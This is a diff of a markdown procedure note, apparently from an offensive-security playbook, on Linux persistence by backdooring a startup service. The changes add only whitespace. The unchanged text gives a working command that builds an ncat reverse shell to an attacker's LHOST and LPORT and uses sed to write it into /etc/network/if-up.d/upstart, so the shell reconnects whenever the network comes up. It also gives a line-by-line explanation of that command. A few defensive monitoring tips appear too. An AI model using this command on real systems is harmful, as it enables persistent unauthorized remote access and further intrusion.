@@ -41,6 +41,8 @@ To execute this procedure, the attacker must first gain initial access to the ta
 
 From a business perspective, this technique can be used by attackers to maintain a foothold in a target environment, allowing them to continue to steal data, disrupt operations, or further compromise the organization.
 
+ 
+
 ## Requirements
 
 1. Initial access to the target system
@@ -51,6 +53,8 @@ From a business perspective, this technique can be used by attackers to maintain
 
 1. Ability to establish a reverse shell connection
 
+ 
+
 ## Defense
 
 1. Monitor system processes for unauthorized modifications
@@ -58,6 +62,8 @@ From a business perspective, this technique can be used by attackers to maintain
 1. Implement strict access controls to limit privileges for system processes
 
 1. Regularly review startup service configuration files for unauthorized changes
+
+ 
 
 ## Objectives
 
@@ -67,13 +73,23 @@ From a business perspective, this technique can be used by attackers to maintain
 
 1. Execute further offensive actions, such as data exfiltration or lateral movement
 
+ 
+
 # Instructions
 
 1. To set up a reverse shell, run the command and it will edit the `/etc/network/if-up.d/upstart` file. This file will then execute the reverse shell command whenever the network interface goes up.
 
+ 
+
+
+
 **Code**: [[RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -]]
 
+
+
 > The command sets up a reverse shell by creating a `RSHELL` variable that contains a `ncat` command. The `ncat` command is used to establish a connection to the attacker's machine at the specified `LHOST` and `LPORT`. The `-e` option is used to execute a command on the remote machine once the connection is established. In this case, the command `/bin/bash -c id;/bin/bash` is executed, which will run the `id` command to display the user ID and group information, followed by an interactive `bash` shell. The `2>/dev/null` option is used to redirect any error messages to `/dev/null`. The `sed` command is then used to insert the `RSHELL` variable into the `/etc/network/if-up.d/upstart` file at line 4. This ensures that the reverse shell command is executed whenever the network interface goes up.
+
+
 
 **Command** ([[Add reverse shell command to if-up.d upstart]]):
 
@@ -81,6 +97,8 @@ From a business perspective, this technique can be used by attackers to maintain
 RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
 sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -110,3 +128,5 @@ sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
 
 - [[Backdooring a startup service]]
 - [[Linux - Persistence]]
+
+
